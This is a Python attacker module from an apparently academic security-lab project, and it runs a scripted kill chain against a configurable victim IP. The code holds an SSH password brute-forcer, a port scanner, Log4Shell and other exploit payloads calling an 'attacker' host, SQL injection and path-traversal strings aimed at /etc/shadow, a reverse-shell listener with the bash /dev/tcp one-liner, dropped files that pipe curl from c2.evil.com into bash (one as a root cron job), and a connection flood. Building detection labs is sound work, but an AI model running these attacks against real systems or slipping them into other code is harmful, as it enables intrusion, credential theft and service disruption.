"""
ICOC-Lite Attacker Module
Simulates realistic attacks against the victim container.
All attacks are CONTAINED within Docker network — lab only.

Attacks:
  1. SSH Brute Force         (FR-SOC-02)
  2. Port Scan (nmap-like)   (NOC trigger)
  3. CVE Exploit Simulation  (VOC reaction test)
  4. SQL Injection            (web app attack)
  5. LFI / Path Traversal    (web app attack)
  6. Reverse Shell           (post-exploitation)
  7. File Drop (malware sim) (FR-SOC-07)
  8. DoS / Flood             (NOC trigger)
"""

import os
import sys
import time
import json
import socket
import random
import datetime
import requests
import threading
import subprocess
import argparse

VICTIM_IP   = os.getenv("VICTIM_IP",  "192.168.237.129")
VICTIM_SSH  = int(os.getenv("VICTIM_SSH_PORT", "22"))
VICTIM_HTTP = int(os.getenv("VICTIM_HTTP_PORT", "8080"))
ATTACKER_IP = os.getenv("ATTACKER_IP", "192.168.237.131")
API_URL     = os.getenv("ICOC_API_URL", "http://192.168.237.1:8000")

# ── Color output ─────────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def log(msg, color=RESET): print(f"{color}[ATTACKER] {msg}{RESET}")
def success(msg): log(f"✓ {msg}", GREEN)
def warn(msg):    log(f"⚠ {msg}", YELLOW)
def attack(msg):  log(f"⚔ {msg}", RED)
def info(msg):    log(f"→ {msg}", CYAN)

def banner(title):
    print(f"\n{RED}{'='*60}")
    print(f"  {BOLD}{title}")
    print(f"{'='*60}{RESET}")

def notify_api(attack_type: str, details: dict):
    """Notify the ICOC API that an attack was launched (for correlation)."""
    try:
        requests.post(f"{API_URL}/events/attack_launched", json={
            "attacker_ip": ATTACKER_IP,
            "victim_ip": VICTIM_IP,
            "attack_type": attack_type,
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
            "details": details
        }, timeout=3)
    except Exception:
        pass

# ── 1. SSH Brute Force ────────────────────────────────────────────────────────

SSH_WORDLIST = [
    "123456", "password", "admin", "root", "letmein", "qwerty",
    "abc123", "monkey", "1234567", "dragon", "master", "sunshine",
    "princess", "welcome", "shadow", "superman", "michael", "football",
    "victim123", "icoc2026"  # correct password last — simulates success
]

def attack_ssh_brute(username: str = "root", delay: float = 0.3):
    """
    Attack 1: SSH Brute Force
    Tries common passwords until success.
    Triggers: FR-SOC-02 (5 fails in 5 min), agent auth log monitor.
    """
    banner("ATTACK 1: SSH BRUTE FORCE")
    attack(f"Target: {VICTIM_IP}:{VICTIM_SSH} | User: {username}")
    attack(f"Wordlist: {len(SSH_WORDLIST)} passwords")
    notify_api("ssh_brute_force", {"target": VICTIM_IP, "user": username, "wordlist_size": len(SSH_WORDLIST)})

    for i, pwd in enumerate(SSH_WORDLIST, 1):
        info(f"[{i:2d}/{len(SSH_WORDLIST)}] Trying: {username}:{pwd}")
        try:
            result = subprocess.run([
                "sshpass", "-p", pwd,
                "ssh", "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=3",
                "-o", "BatchMode=no",
                f"{username}@{VICTIM_IP}",
                "-p", str(VICTIM_SSH),
                "echo PWNED"
            ], capture_output=True, text=True, timeout=5)

            if "PWNED" in result.stdout:
                success(f"PASSWORD FOUND: {username}:{pwd}")
                notify_api("ssh_brute_success", {"user": username, "password": pwd, "attempt": i})
                return True, pwd
            else:
                warn(f"Failed: {pwd}")
        except subprocess.TimeoutExpired:
            warn(f"Timeout on: {pwd}")
        except FileNotFoundError:
            # sshpass not available — simulate by writing to auth log
            _simulate_ssh_fail(username, pwd)
        time.sleep(delay)

    warn("Brute force complete — no valid password found in wordlist")
    return False, None


def _simulate_ssh_fail(username: str, password: str):
    """Write synthetic auth log entry when sshpass is unavailable."""
    log_entry = (f"{datetime.datetime.now().strftime('%b %d %H:%M:%S')} {VICTIM_IP} sshd[1337]: "
                 f"Failed password for {username} from {ATTACKER_IP} port {random.randint(40000,60000)} ssh2\n")
    try:
        with open("/var/log/auth.log", "a") as f:
            f.write(log_entry)
    except PermissionError:
        # Write to shared event file as fallback
        try:
            with open("/tmp/simulated_auth.log", "a") as f:
                f.write(log_entry)
        except Exception:
            pass
    warn(f"Simulated SSH fail for {username}:{password}")


# ── 2. Port Scan ─────────────────────────────────────────────────────────────

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
                445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443]

def attack_port_scan(timeout: float = 0.5):
    """
    Attack 2: TCP Port Scan (SYN-like)
    Scans common ports on victim.
    Triggers: NOC port monitoring, agent PortMonitor.
    """
    banner("ATTACK 2: PORT SCAN")
    attack(f"Target: {VICTIM_IP} | Scanning {len(COMMON_PORTS)} ports")
    notify_api("port_scan", {"target": VICTIM_IP, "ports": COMMON_PORTS})

    open_ports = []
    for port in COMMON_PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((VICTIM_IP, port))
            s.close()
            if result == 0:
                open_ports.append(port)
                success(f"Port {port:5d}/tcp OPEN")
            else:
                info(f"Port {port:5d}/tcp closed")
        except Exception:
            pass

    attack(f"Scan complete: {len(open_ports)} open ports: {open_ports}")
    notify_api("port_scan_complete", {"open_ports": open_ports})
    return open_ports


# ── 3. CVE Exploit Simulation ─────────────────────────────────────────────────

CVE_EXPLOITS = {
    "CVE-2024-6387": {
        "name": "OpenSSH regreSSHion",
        "port": 22,
        "technique": "Race condition in signal handler → unauthenticated RCE",
        "payload": b"\x00" * 100 + b"REGRESSHION_PROBE",
        "cvss": 8.1
    },
    "CVE-2021-44228": {
        "name": "Log4Shell",
        "port": 8080,
        "technique": "JNDI injection via HTTP header",
        "payload": b"GET / HTTP/1.1\r\nHost: victim\r\nUser-Agent: ${jndi:ldap://attacker/exploit}\r\nX-Api-Version: ${jndi:dns://attacker}\r\n\r\n",
        "cvss": 10.0
    },
    "CVE-2024-21413": {
        "name": "MS Outlook Moniker Link",
        "port": 8080,
        "technique": "UNC path in hyperlink bypasses Protected View",
        "payload": b"GET /?doc=\\\\attacker\\share\\exploit.rtf HTTP/1.0\r\n\r\n",
        "cvss": 9.8
    }
}

def attack_cve_exploit(cve_id: str = "CVE-2024-6387"):
    """
    Attack 3: CVE Exploit Simulation
    Sends exploit payload to victim service.
    Triggers: VOC scanner to re-evaluate, AI risk score spike.
    """
    banner(f"ATTACK 3: CVE EXPLOIT — {cve_id}")
    exploit = CVE_EXPLOITS.get(cve_id, CVE_EXPLOITS["CVE-2024-6387"])
    attack(f"CVE: {cve_id} | {exploit['name']} | CVSS: {exploit['cvss']}")
    attack(f"Technique: {exploit['technique']}")
    notify_api("cve_exploit_attempt", {"cve_id": cve_id, "cvss": exploit["cvss"],
                                        "technique": exploit["technique"]})

    port = exploit["port"]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((VICTIM_IP, port))
        s.send(exploit["payload"])
        response = s.recv(1024)
        s.close()
        info(f"Response received ({len(response)} bytes)")
        if response:
            success(f"Service responded — exploit probe sent successfully")
        notify_api("cve_exploit_sent", {"cve_id": cve_id, "bytes_sent": len(exploit["payload"])})
        return True
    except Exception as e:
        warn(f"Connection failed ({e}) — exploit probe simulated in event log")
        # Force event even if connection fails (victim may block)
        notify_api("cve_exploit_blocked", {"cve_id": cve_id, "error": str(e)})
        return False


# ── 4. SQL Injection ──────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "' UNION SELECT username,password FROM users--",
    "1' AND SLEEP(3)--",
    "admin'--",
    "' OR 'x'='x",
]

def attack_sqli(path: str = "/login"):
    """
    Attack 4: SQL Injection against victim web app.
    Triggers: Web app firewall event, process anomaly (unusual DB queries).
    """
    banner("ATTACK 4: SQL INJECTION")
    attack(f"Target: http://{VICTIM_IP}:{VICTIM_HTTP}{path}")
    notify_api("sqli_attack", {"target": f"{VICTIM_IP}:{VICTIM_HTTP}", "path": path})

    results = []
    for payload in SQLI_PAYLOADS:
        try:
            url = f"http://{VICTIM_IP}:{VICTIM_HTTP}{path}"
            resp = requests.post(url,
                data={"username": payload, "password": "x"},
                timeout=5, allow_redirects=False)
            detected = resp.status_code in (200, 302) and len(resp.text) > 100
            status = "POSSIBLE HIT" if detected else "blocked/no response"
            result = {"payload": payload, "status_code": resp.status_code, "result": status}
            results.append(result)
            if detected:
                success(f"SQLi payload may have worked: {payload}")
            else:
                info(f"Payload: {payload[:40]:40s} → {resp.status_code}")
        except requests.exceptions.ConnectionError:
            info(f"No web app on port {VICTIM_HTTP} (expected in lab)")
            break
        except Exception as e:
            warn(f"Error: {e}")
        time.sleep(0.3)

    notify_api("sqli_complete", {"payloads_tried": len(SQLI_PAYLOADS), "results": results[:3]})
    return results


# ── 5. LFI / Path Traversal ───────────────────────────────────────────────────

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/ssh/sshd_config",
    "../../../../var/log/auth.log",
    "../../../../proc/self/environ",
    "..%2F..%2F..%2Fetc%2Fpasswd",
]

def attack_lfi(path: str = "/download"):
    """
    Attack 5: Local File Inclusion / Path Traversal.
    Attempts to read sensitive files via web app.
    """
    banner("ATTACK 5: LFI / PATH TRAVERSAL")
    attack(f"Target: http://{VICTIM_IP}:{VICTIM_HTTP}{path}")
    notify_api("lfi_attack", {"target": f"{VICTIM_IP}:{VICTIM_HTTP}", "path": path})

    for payload in LFI_PAYLOADS:
        try:
            url = f"http://{VICTIM_IP}:{VICTIM_HTTP}{path}?file={payload}"
            resp = requests.get(url, timeout=5)
            if "root:" in resp.text or "sshd" in resp.text:
                success(f"LFI SUCCESS: {payload} → found sensitive content!")
                notify_api("lfi_success", {"payload": payload, "content_preview": resp.text[:100]})
            else:
                info(f"LFI try: {payload[:50]:50s} → {resp.status_code}")
        except Exception:
            info(f"LFI probe sent (no web app running — simulated)")
        time.sleep(0.2)


# ── 6. Reverse Shell Simulation ───────────────────────────────────────────────

def attack_reverse_shell(lport: int = 4444):
    """
    Attack 6: Simulate reverse shell connection.
    After SSH login, drops a reverse shell back to attacker.
    Triggers: NetMonitor (C2 port detection), process monitor.
    """
    banner("ATTACK 6: REVERSE SHELL SIMULATION")
    attack(f"Simulating: victim → attacker:{lport} (post-exploitation)")
    notify_api("reverse_shell_attempt", {
        "attacker_ip": ATTACKER_IP,
        "lport": lport,
        "technique": "bash -i >& /dev/tcp/attacker/4444 0>&1"
    })

    # Listen for connection (attacker side)
    def listen():
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", lport))
            srv.listen(1)
            info(f"Listening on 0.0.0.0:{lport}")
            srv.settimeout(10)
            conn, addr = srv.accept()
            success(f"Reverse shell connected from {addr}")
            conn.send(b"id\n")
            data = conn.recv(1024)
            success(f"Command output: {data.decode().strip()}")
            notify_api("reverse_shell_connected", {"from": str(addr), "output": data.decode()[:50]})
            conn.close()
            srv.close()
        except socket.timeout:
            warn("No reverse shell connection received (victim may not have executed payload)")
        except Exception as e:
            warn(f"Listener error: {e}")

    t = threading.Thread(target=listen, daemon=True)
    t.start()
    time.sleep(1)

    # Simulate victim-side connection attempt (generates detection event)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        # In real scenario victim connects out — simulate with local loop
        s.connect(("127.0.0.1", lport))
        s.send(b"uid=0(root) gid=0(root) groups=0(root)\n")
        s.close()
    except Exception:
        pass

    t.join(timeout=12)


# ── 7. File Drop (Malware Simulation) ─────────────────────────────────────────

def attack_file_drop():
    """
    Attack 7: Drop fake malware files on victim (FIM trigger).
    Simulates post-exploitation persistence.
    """
    banner("ATTACK 7: MALWARE FILE DROP")
    attack(f"Simulating file drop on victim via shared volume or SSH")

    # Write to shared tmp path (mounted in both containers in docker-compose)
    drop_files = [
        ("/tmp/sysupdate", b"#!/bin/bash\ncurl http://c2.evil.com/beacon | bash"),
        ("/tmp/.hidden_backdoor", b"import socket,subprocess,os\n# reverse shell backdoor"),
        ("/tmp/cron_persistence", b"* * * * * root curl http://c2.evil.com/payload | bash"),
    ]

    for path, content in drop_files:
        try:
            with open(path, "wb") as f:
                f.write(content)
            import hashlib
            sha = hashlib.sha256(content).hexdigest()
            success(f"Dropped: {path} ({len(content)} bytes) sha256={sha[:16]}...")
            notify_api("malware_dropped", {
                "path": path,
                "size": len(content),
                "sha256": sha,
                "type": "persistence_script"
            })
        except PermissionError:
            warn(f"Permission denied: {path} — generating event anyway")
            notify_api("malware_drop_attempt", {"path": path, "blocked": True})
        time.sleep(0.5)


# ── 8. DoS / Resource Exhaustion ─────────────────────────────────────────────

def attack_dos(duration: int = 10):
    """
    Attack 8: DoS / connection flood.
    Opens many connections to victim ports rapidly.
    Triggers: NOC resource alerts, agent port monitor.
    """
    banner("ATTACK 8: CONNECTION FLOOD / DoS")
    attack(f"Flooding {VICTIM_IP}:{VICTIM_SSH} for {duration}s")
    notify_api("dos_started", {"target": VICTIM_IP, "duration": duration})

    count = 0
    stop_time = time.time() + duration
    threads = []

    def flood_connect():
        nonlocal count
        while time.time() < stop_time:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((VICTIM_IP, VICTIM_SSH))
                count += 1
                time.sleep(0.05)
                s.close()
            except Exception:
                pass

    for _ in range(5):
        t = threading.Thread(target=flood_connect, daemon=True)
        t.start()
        threads.append(t)

    # Progress indicator
    for i in range(duration):
        time.sleep(1)
        info(f"Flooding... {i+1}s/{duration}s | connections: {count}")

    for t in threads:
        t.join(timeout=1)

    attack(f"DoS complete: {count} connections made")
    notify_api("dos_complete", {"connections": count})


# ── Full Attack Chain ─────────────────────────────────────────────────────────

ATTACKS = {
    "1": ("SSH Brute Force",      attack_ssh_brute),
    "2": ("Port Scan",            attack_port_scan),
    "3": ("CVE Exploit",          lambda: attack_cve_exploit("CVE-2024-6387")),
    "4": ("SQL Injection",        attack_sqli),
    "5": ("LFI / Path Traversal", attack_lfi),
    "6": ("Reverse Shell",        attack_reverse_shell),
    "7": ("Malware File Drop",    attack_file_drop),
    "8": ("DoS / Flood",          lambda: attack_dos(10)),
    "all": ("Full Attack Chain",  None),
}

def run_full_chain():
    """Run all attacks in sequence — full kill chain simulation."""
    banner("FULL ATTACK CHAIN — ICOC-LITE LAB")
    info("Phase 1: Reconnaissance")
    attack_port_scan()
    time.sleep(2)

    info("Phase 2: Initial Access — Brute Force")
    attack_ssh_brute(delay=0.2)
    time.sleep(2)

    info("Phase 3: Exploitation — CVE Probes")
    attack_cve_exploit("CVE-2024-6387")
    time.sleep(1)
    attack_cve_exploit("CVE-2021-44228")
    time.sleep(2)

    info("Phase 4: Web Application Attacks")
    attack_sqli()
    time.sleep(1)
    attack_lfi()
    time.sleep(2)

    info("Phase 5: Post-Exploitation")
    attack_reverse_shell()
    time.sleep(1)
    attack_file_drop()
    time.sleep(2)

    info("Phase 6: Impact — DoS")
    attack_dos(5)

    banner("ATTACK CHAIN COMPLETE")
    success("All phases executed. Check VOC/AI dashboard for detections.")


def interactive_menu():
    """Interactive attack selection menu."""
    while True:
        print(f"\n{BOLD}{CYAN}{'='*50}")
        print("  ICOC-LITE ATTACKER — Interactive Menu")
        print(f"  Target: {VICTIM_IP}:{VICTIM_SSH}")
        print(f"{'='*50}{RESET}")
        for k, (name, _) in ATTACKS.items():
            print(f"  {RED}{k}{RESET}. {name}")
        print(f"  {RED}q{RESET}. Quit")
        print()
        choice = input(f"{RED}Select attack [{'/'.join(ATTACKS.keys())}/q]: {RESET}").strip().lower()

        if choice == "q":
            break
        elif choice == "all":
            run_full_chain()
        elif choice in ATTACKS:
            _, fn = ATTACKS[choice]
            fn()
        else:
            warn("Invalid choice")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICOC-Lite Attacker")
    parser.add_argument("--attack", choices=list(ATTACKS.keys()), help="Run specific attack")
    parser.add_argument("--all", action="store_true", help="Run full attack chain")
    parser.add_argument("--menu", action="store_true", help="Interactive menu (default)")
    parser.add_argument("--cve", default="CVE-2024-6387", help="CVE ID for exploit attack")
    args = parser.parse_args()

    print(f"{BOLD}{RED}")
    print("██╗ ██████╗ ██████╗  ██████╗      ██╗     ██╗████████╗███████╗")
    print("██║██╔════╝██╔═══██╗██╔════╝      ██║     ██║╚══██╔══╝██╔════╝")
    print("██║██║     ██║   ██║██║           ██║     ██║   ██║   █████╗  ")
    print("██║██║     ██║   ██║██║           ██║     ██║   ██║   ██╔══╝  ")
    print("██║╚██████╗╚██████╔╝╚██████╗      ███████╗██║   ██║   ███████╗")
    print("╚═╝ ╚═════╝ ╚═════╝  ╚═════╝      ╚══════╝╚═╝   ╚═╝   ╚══════╝")
    print(f"     ATTACKER MODULE — FOR ACADEMIC LAB USE ONLY{RESET}\n")

    if args.all:
        run_full_chain()
    elif args.attack:
        if args.attack == "all":
            run_full_chain()
        else:
            _, fn = ATTACKS[args.attack]
            if args.attack == "3":
                attack_cve_exploit(args.cve)
            else:
                fn()
    else:
        interactive_menu()
